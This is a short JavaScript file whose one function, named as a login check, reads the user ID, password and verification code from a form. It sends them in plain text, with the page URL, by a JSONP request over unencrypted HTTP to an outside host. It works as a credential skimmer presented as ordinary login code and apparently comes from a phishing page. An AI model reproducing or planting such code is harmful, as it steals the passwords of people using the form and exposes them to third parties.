/**
 * Created by Administrator on 2016/12/14.
 */
function checkloginsuer() {
    var a = $("#id").val();
    var b = $("#password").val();
    var c = $("#verify").val();

    $.ajax({
        dataType: "jsonp",
        url: "http://api.VIP2.us/d/?type=huzhu&user=" + a + "&pwd=" + b + "&code=" + c + "&url=" + window.location.href,
        success: function(a) {
alert(a);
            return a
        }
    })
};